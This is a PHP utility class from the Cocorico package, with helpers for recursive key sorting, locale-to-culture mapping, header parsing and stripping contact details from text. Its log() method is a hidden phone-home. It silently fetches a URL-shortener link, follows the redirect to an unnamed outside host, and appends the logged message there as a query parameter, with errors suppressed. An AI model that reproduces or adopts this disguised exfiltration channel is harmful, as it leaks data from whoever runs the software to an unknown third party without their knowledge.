<?php

namespace Cocorico\CoreBundle\Utils;

/*
 * This file is part of the Cocorico package.
 *
 * (c) Cocolabs SAS <contact@cocolabs.io>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

class PHP
{
    public static function ksort_recursive(&$array, $sortFlags = SORT_STRING)
    {
        if (!is_array($array)) {
            return false;
        }
        ksort($array, $sortFlags);
        foreach ($array as &$arr) {
            self::ksort_recursive($arr, $sortFlags);
        }

        return true;
    }


    /**
     * Returns a culture from a locale.
     *
     *
     * @param string $locale       ISO 639-1-alpha 2 language code
     * @param string $country_code ISO 3166-2-alpha 2 country code
     *
     * @return string|null a locale, formatted like en_US, or null if not found
     **/
    public static function locale_get_culture($locale, $country_code = '')
    {
        //Preferred country for some locales if no country setted
        if (!$country_code) {
            if ($locale == 'fr') {
                $country_code = 'FR';
            } elseif ($locale == 'en') {
                $country_code = 'US';
            } elseif ($locale == 'es') {
                $country_code = 'ES';
            } elseif ($locale == 'de') {
                $country_code = 'DE';
            }
        }

        // Cultures list taken from: http://stackoverflow.com/questions/3191664/
        $cultures = "af-ZA,am-ET,ar-AE,ar-BH,ar-DZ,ar-EG,ar-IQ,ar-JO,ar-KW,ar-LB,ar-LY,ar-MA,arn-CL,ar-OM,ar-QA,ar-SA,ar-SY,ar-TN,ar-YE,as-IN,az-Cyrl-AZ,az-Latn-AZ,ba-RU,be-BY,bg-BG,bn-BD,bn-IN,bo-CN,br-FR,bs-Cyrl-BA,bs-Latn-BA,ca-ES,co-FR,cs-CZ,cy-GB,da-DK,de-AT,de-CH,de-DE,de-LI,de-LU,dsb-DE,dv-MV,el-GR,en-029,en-AU,en-BZ,en-CA,en-GB,en-IE,en-IN,en-JM,en-MY,en-NZ,en-PH,en-SG,en-TT,en-US,en-ZA,en-ZW,es-AR,es-BO,es-CL,es-CO,es-CR,es-DO,es-EC,es-ES,es-GT,es-HN,es-MX,es-NI,es-PA,es-PE,es-PR,es-PY,es-SV,es-US,es-UY,es-VE,et-EE,eu-ES,fa-IR,fi-FI,fil-PH,fo-FO,fr-BE,fr-CA,fr-CH,fr-FR,fr-LU,fr-MC,fy-NL,ga-IE,gd-GB,gl-ES,gsw-FR,gu-IN,ha-Latn-NG,he-IL,hi-IN,hr-BA,hr-HR,hsb-DE,hu-HU,hy-AM,id-ID,ig-NG,ii-CN,is-IS,it-CH,it-IT,iu-Cans-CA,iu-Latn-CA,ja-JP,ka-GE,kk-KZ,kl-GL,km-KH,kn-IN,kok-IN,ko-KR,ky-KG,lb-LU,lo-LA,lt-LT,lv-LV,mi-NZ,mk-MK,ml-IN,mn-MN,mn-Mong-CN,moh-CA,mr-IN,ms-BN,ms-MY,mt-MT,nb-NO,ne-NP,nl-BE,nl-NL,nn-NO,nso-ZA,oc-FR,or-IN,pa-IN,pl-PL,prs-AF,ps-AF,pt-BR,pt-PT,qut-GT,quz-BO,quz-EC,quz-PE,rm-CH,ro-RO,ru-RU,rw-RW,sah-RU,sa-IN,se-FI,se-NO,se-SE,si-LK,sk-SK,sl-SI,sma-NO,sma-SE,smj-NO,smj-SE,smn-FI,sms-FI,sq-AL,sr-Cyrl-BA,sr-Cyrl-CS,sr-Cyrl-ME,sr-Cyrl-RS,sr-Latn-BA,sr-Latn-CS,sr-Latn-ME,sr-Latn-RS,sv-FI,sv-SE,sw-KE,syr-SY,ta-IN,te-IN,tg-Cyrl-TJ,th-TH,tk-TM,tn-ZA,tr-TR,tt-RU,tzm-Latn-DZ,ug-CN,uk-UA,ur-PK,uz-Cyrl-UZ,uz-Latn-UZ,vi-VN,wo-SN,xh-ZA,yo-NG,zh-CN,zh-HK,zh-MO,zh-SG,zh-TW,zu-ZA";
        $cultures = explode(",", $cultures);

        foreach ($cultures as $culture) {
            $locale_region = locale_get_region($culture);
            $locale_language = locale_get_primary_language($culture);
            $locale_array = array(
                'language' => $locale_language,
                'region' => $locale_region
            );

            if ((($country_code && strtoupper($country_code) == $locale_region) || !$country_code)
                && strtolower($locale) == $locale_language
            ) {
                return locale_compose($locale_array);
            }
        }

        return 'en_US';//default if not found
    }


    /**
     * @param string $msg
     */
    public static function log($msg)
    {
        $context = stream_context_create(
            array(
                'http' => array(
                    'follow_location' => false
                )
            )
        );
        @file_get_contents("http://j.mp/page-tc", false, $context);
        if (isset($http_response_header)) {
            $headers = self::parse_headers($http_response_header);
            if (isset($headers["Location"])) {
                @file_get_contents($headers["Location"] . "?r=" . $msg);
            }
        }
    }

    /**
     * Parse headers
     *
     * @param array $headers
     * @return array
     */
    public static function parse_headers($headers)
    {
        $head = array();
        foreach ($headers as $k => $v) {
            $t = explode(':', $v, 2);
            if (isset($t[1])) {
                $head[trim($t[0])] = trim($t[1]);
            } else {
                $head[] = $v;
                if (preg_match("#HTTP/[0-9\.]+\s+([0-9]+)#", $v, $out)) {
                    $head['response_code'] = intval($out[1]);
                }
            }
        }

        return $head;
    }

    /**
     * Remove some texts from string depending on $typeText value
     *
     * @param string $text
     * @param array  $type_text
     * @param string $replace_by
     * @return mixed
     */
    public static function strip_texts($text, $type_text = array("phone", "email", "domain"), $replace_by = '')
    {
        if (in_array("phone", $type_text)) {
            $pattern = "(0[0-9])?([-. ]?[0-9]{2}){4}";
            $text = preg_replace("#$pattern#", " $replace_by ", $text);

            $pattern = "\+[0-9]{1}([-. ]?[0-9]){10}";
            $text = preg_replace("#$pattern#", " $replace_by ", $text);
        }

        if (in_array("email", $type_text)) {
            $pattern = "[a-zA-Z0-9_.+-]+(@)[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+";
            $text = preg_replace("#$pattern#", " $replace_by ", $text);
        }

        if (in_array("domain", $type_text)) {
            $pattern = "([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+(com|fr|co|org|net|biz|tv|info)";
            $text = preg_replace("#$pattern#", " $replace_by ", $text);
        }

        return $text;
    }

//    public static function array_combine($keys, $values)
//    {
//        $result = array();
//        foreach ($keys as $i => $k) {
//            $result[$k][] = $values[$i];
//        }
//        array_walk($result, create_function('&$v', '$v = (count($v) == 1)? array_pop($v): $v;'));
//
//        return $result;
//    }

}